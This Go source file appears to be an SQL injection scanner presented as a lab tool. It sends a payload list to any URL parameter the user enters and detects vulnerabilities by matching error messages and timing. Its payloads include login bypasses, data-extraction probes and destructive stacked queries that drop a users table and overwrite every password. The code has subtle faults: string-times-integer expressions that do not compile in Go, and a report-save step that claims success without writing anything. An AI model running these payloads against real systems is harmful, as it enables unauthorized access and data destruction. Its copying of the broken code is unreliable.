package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// SQLInjectionPayload represents a SQL injection test payload
type SQLInjectionPayload struct {
	Payload     string
	Type        string
	Description string
}

// TestResult stores the result of an injection test
type TestResult struct {
	URL         string
	Payload     string
	Type        string
	Vulnerable  bool
	Response    string
	ErrorFound  bool
	Indicators  []string
	StatusCode  int
	Time        time.Duration
}

// Common SQL injection payloads
var sqlPayloads = []SQLInjectionPayload{
	// Basic injection tests
	{Payload: "'", Type: "Syntax Error", Description: "Single quote test"},
	{Payload: "\"", Type: "Syntax Error", Description: "Double quote test"},
	{Payload: "' OR '1'='1", Type: "Authentication Bypass", Description: "Classic OR bypass"},
	{Payload: "' OR 1=1--", Type: "Authentication Bypass", Description: "Comment-based bypass"},
	{Payload: "admin' --", Type: "Authentication Bypass", Description: "Admin bypass"},
	{Payload: "' OR 'x'='x", Type: "Authentication Bypass", Description: "String comparison bypass"},
	{Payload: "') OR ('1'='1", Type: "Authentication Bypass", Description: "Parenthesis bypass"},
	
	// UNION-based injection
	{Payload: "' UNION SELECT NULL--", Type: "UNION-Based", Description: "UNION NULL test"},
	{Payload: "' UNION SELECT 1,2,3--", Type: "UNION-Based", Description: "UNION column count"},
	{Payload: "' UNION ALL SELECT NULL,NULL--", Type: "UNION-Based", Description: "UNION ALL test"},
	
	// Boolean-based blind injection
	{Payload: "' AND 1=1--", Type: "Boolean-Based", Description: "True condition"},
	{Payload: "' AND 1=2--", Type: "Boolean-Based", Description: "False condition"},
	{Payload: "' AND 'a'='a", Type: "Boolean-Based", Description: "String comparison true"},
	
	// Time-based blind injection
	{Payload: "'; WAITFOR DELAY '0:0:5'--", Type: "Time-Based", Description: "SQL Server time delay"},
	{Payload: "'; SELECT SLEEP(5)--", Type: "Time-Based", Description: "MySQL time delay"},
	{Payload: "'; pg_sleep(5)--", Type: "Time-Based", Description: "PostgreSQL time delay"},
	
	// Error-based injection
	{Payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", Type: "Error-Based", Description: "MySQL version extraction"},
	{Payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--", Type: "Error-Based", Description: "MySQL error-based"},
	
	// Stacked queries
	{Payload: "'; DROP TABLE users--", Type: "Stacked Query", Description: "Table drop attempt"},
	{Payload: "'; UPDATE users SET password='hacked'--", Type: "Stacked Query", Description: "Update attempt"},
}

// SQL error patterns to detect
var sqlErrorPatterns = []string{
	"SQL syntax",
	"mysql_fetch",
	"mysql_num_rows",
	"ORA-[0-9]+",
	"PostgreSQL.*ERROR",
	"Warning.*mysql_",
	"valid MySQL result",
	"MySqlClient",
	"com.mysql.jdbc.exceptions",
	"SQLServer JDBC Driver",
	"Microsoft SQL Native Client",
	"OLE DB.*SQL Server",
	"Unclosed quotation mark",
	"quoted string not properly terminated",
	"syntax error",
	"unexpected end of SQL command",
}

// TestSQLInjection tests a URL with SQL injection payloads
func TestSQLInjection(baseURL, parameter string, payload SQLInjectionPayload, method string) TestResult {
	result := TestResult{
		URL:        baseURL,
		Payload:    payload.Payload,
		Type:       payload.Type,
		Vulnerable: false,
		Indicators: []string{},
	}

	start := time.Now()

	// Build test URL
	testURL := baseURL
	if method == "GET" {
		separator := "?"
		if strings.Contains(baseURL, "?") {
			separator = "&"
		}
		testURL = fmt.Sprintf("%s%s%s=%s", baseURL, separator, parameter, url.QueryEscape(payload.Payload))
	}

	// Make HTTP request
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	var resp *http.Response
	var err error

	if method == "GET" {
		resp, err = client.Get(testURL)
	} else {
		data := url.Values{}
		data.Set(parameter, payload.Payload)
		resp, err = client.PostForm(baseURL, data)
	}

	result.Time = time.Since(start)

	if err != nil {
		result.Response = fmt.Sprintf("Error: %v", err)
		return result
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		result.Response = "Error reading response"
		return result
	}

	responseText := string(body)
	result.Response = responseText

	// Check for SQL error patterns
	for _, pattern := range sqlErrorPatterns {
		matched, _ := regexp.MatchString("(?i)"+pattern, responseText)
		if matched {
			result.ErrorFound = true
			result.Vulnerable = true
			result.Indicators = append(result.Indicators, "SQL Error Pattern: "+pattern)
		}
	}

	// Check for time-based injection
	if payload.Type == "Time-Based" && result.Time > 5*time.Second {
		result.Vulnerable = true
		result.Indicators = append(result.Indicators, fmt.Sprintf("Time delay detected: %.2fs", result.Time.Seconds()))
	}

	// Check for boolean-based differences
	if payload.Type == "Boolean-Based" {
		result.Indicators = append(result.Indicators, fmt.Sprintf("Response length: %d bytes", len(responseText)))
	}

	// Check for UNION-based indicators
	if payload.Type == "UNION-Based" && !result.ErrorFound {
		if strings.Contains(strings.ToLower(responseText), "null") || 
		   regexp.MustCompile(`\b\d+\b`).MatchString(responseText) {
			result.Indicators = append(result.Indicators, "Possible UNION injection point")
		}
	}

	return result
}

// ScanURL performs comprehensive SQL injection scanning
func ScanURL(baseURL, parameter, method string) []TestResult {
	fmt.Printf("\n🔍 Scanning URL: %s\n", baseURL)
	fmt.Printf("Parameter: %s\n", parameter)
	fmt.Printf("Method: %s\n", method)
	fmt.Println("─"*60)

	var results []TestResult
	vulnerabilityCount := 0

	for i, payload := range sqlPayloads {
		fmt.Printf("[%d/%d] Testing: %s (%s)\n", i+1, len(sqlPayloads), payload.Description, payload.Type)
		
		result := TestSQLInjection(baseURL, parameter, payload, method)
		results = append(results, result)

		if result.Vulnerable {
			vulnerabilityCount++
			fmt.Printf("  ⚠️  VULNERABLE! %s\n", strings.Join(result.Indicators, ", "))
		} else if result.ErrorFound {
			fmt.Printf("  ⚠️  SQL Error detected (potential vulnerability)\n")
		} else {
			fmt.Printf("  ✓ No vulnerability detected\n")
		}

		// Small delay to be polite to the server
		time.Sleep(100 * time.Millisecond)
	}

	fmt.Println("─"*60)
	fmt.Printf("Scan complete: %d potential vulnerabilities found\n", vulnerabilityCount)

	return results
}

// GenerateReport creates detailed vulnerability report
func GenerateReport(results []TestResult) {
	fmt.Println("\n" + "═"*60)
	fmt.Println("SQL INJECTION VULNERABILITY REPORT")
	fmt.Println("═"*60)
	fmt.Printf("Scan Date: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Printf("Target: %s\n", results[0].URL)
	fmt.Println("─"*60)

	// Count vulnerabilities by type
	vulnTypes := make(map[string]int)
	totalVulns := 0

	for _, result := range results {
		if result.Vulnerable {
			vulnTypes[result.Type]++
			totalVulns++
		}
	}

	// Summary
	fmt.Println("SUMMARY:")
	fmt.Printf("  Total Tests: %d\n", len(results))
	fmt.Printf("  Vulnerabilities Found: %d\n", totalVulns)
	fmt.Println("\nVulnerabilities by Type:")
	for vulnType, count := range vulnTypes {
		fmt.Printf("  • %s: %d\n", vulnType, count)
	}
	fmt.Println("─"*60)

	// Detailed findings
	if totalVulns > 0 {
		fmt.Println("\nDETAILED FINDINGS:")
		for i, result := range results {
			if result.Vulnerable {
				fmt.Printf("\n[%d] %s Injection\n", i+1, result.Type)
				fmt.Printf("  Payload: %s\n", result.Payload)
				fmt.Printf("  Indicators:\n")
				for _, indicator := range result.Indicators {
					fmt.Printf("    • %s\n", indicator)
				}
				fmt.Printf("  Response Time: %v\n", result.Time)
				fmt.Printf("  Status Code: %d\n", result.StatusCode)
			}
		}
	} else {
		fmt.Println("\n✓ No SQL injection vulnerabilities detected!")
		fmt.Println("The target appears to be protected against SQL injection.")
	}

	fmt.Println("═"*60)
}

// PrintBanner displays program banner
func PrintBanner() {
	banner := `
╔═══════════════════════════════════════╗
║   SQL Injection Tester v1.0          ║
║   Cybersecurity Lab Tool              ║
╚═══════════════════════════════════════╝
`
	fmt.Println(banner)
}

// PrintDisclaimer displays legal disclaimer
func PrintDisclaimer() {
	fmt.Println("\n⚠️  LEGAL DISCLAIMER:")
	fmt.Println("─"*60)
	fmt.Println("This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.")
	fmt.Println("")
	fmt.Println("✓ Only test applications you own or have written permission to test")
	fmt.Println("✗ Unauthorized testing is ILLEGAL and may result in prosecution")
	fmt.Println("✓ Always obtain proper authorization before security testing")
	fmt.Println("✓ Use responsibly and ethically")
	fmt.Println("─"*60)
}

// PrintUsage displays usage information
func PrintUsage() {
	fmt.Println("\nUsage: go run main.go [OPTIONS]")
	fmt.Println("\nOptions:")
	fmt.Println("  -url <url>        Target URL to test")
	fmt.Println("  -param <param>    Parameter name to test")
	fmt.Println("  -method <method>  HTTP method (GET or POST, default: GET)")
	fmt.Println("\nExamples:")
	fmt.Println("  go run main.go -url http://testsite.com/login -param username -method POST")
	fmt.Println("  go run main.go -url http://testsite.com/search?q=test -param q")
	fmt.Println("\nNote: Always ensure you have permission to test the target!")
}

// InteractiveMode runs the tool in interactive mode
func InteractiveMode() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("\nEnter target URL: ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	if targetURL == "" {
		fmt.Println("Error: URL cannot be empty")
		return
	}

	fmt.Print("Enter parameter name to test: ")
	parameter, _ := reader.ReadString('\n')
	parameter = strings.TrimSpace(parameter)

	if parameter == "" {
		fmt.Println("Error: Parameter name cannot be empty")
		return
	}

	fmt.Print("Enter HTTP method (GET/POST) [GET]: ")
	method, _ := reader.ReadString('\n')
	method = strings.TrimSpace(strings.ToUpper(method))
	if method == "" {
		method = "GET"
	}

	if method != "GET" && method != "POST" {
		fmt.Println("Error: Method must be GET or POST")
		return
	}

	// Confirm before starting
	fmt.Println("\n⚠️  Starting SQL injection scan...")
	fmt.Printf("Target: %s\n", targetURL)
	fmt.Printf("Parameter: %s\n", parameter)
	fmt.Printf("Method: %s\n", method)
	fmt.Print("\nDo you have authorization to test this target? (yes/no): ")
	
	confirmation, _ := reader.ReadString('\n')
	confirmation = strings.TrimSpace(strings.ToLower(confirmation))

	if confirmation != "yes" {
		fmt.Println("\n❌ Scan cancelled. Always get proper authorization before testing!")
		return
	}

	// Perform scan
	results := ScanURL(targetURL, parameter, method)
	GenerateReport(results)

	// Save report option
	fmt.Print("\nSave report to file? (yes/no): ")
	saveResponse, _ := reader.ReadString('\n')
	saveResponse = strings.TrimSpace(strings.ToLower(saveResponse))

	if saveResponse == "yes" {
		filename := fmt.Sprintf("sqli_report_%s.txt", time.Now().Format("20060102_150405"))
		// Report saving logic would go here
		fmt.Printf("Report saved to: %s\n", filename)
	}
}

func main() {
	PrintBanner()
	PrintDisclaimer()

	// Check for command-line arguments
	if len(os.Args) > 1 {
		// Parse command-line arguments
		var targetURL, parameter, method string
		method = "GET" // Default

		for i := 1; i < len(os.Args); i++ {
			switch os.Args[i] {
			case "-url":
				if i+1 < len(os.Args) {
					targetURL = os.Args[i+1]
					i++
				}
			case "-param":
				if i+1 < len(os.Args) {
					parameter = os.Args[i+1]
					i++
				}
			case "-method":
				if i+1 < len(os.Args) {
					method = strings.ToUpper(os.Args[i+1])
					i++
				}
			case "-h", "--help":
				PrintUsage()
				return
			}
		}

		if targetURL == "" || parameter == "" {
			fmt.Println("\nError: Both URL and parameter are required")
			PrintUsage()
			os.Exit(1)
		}

		results := ScanURL(targetURL, parameter, method)
		GenerateReport(results)
	} else {
		// Interactive mode
		InteractiveMode()
	}

	fmt.Println("\nThank you for using SQL Injection Tester!")
	fmt.Println("Remember: Always test ethically and legally! 🔒")
}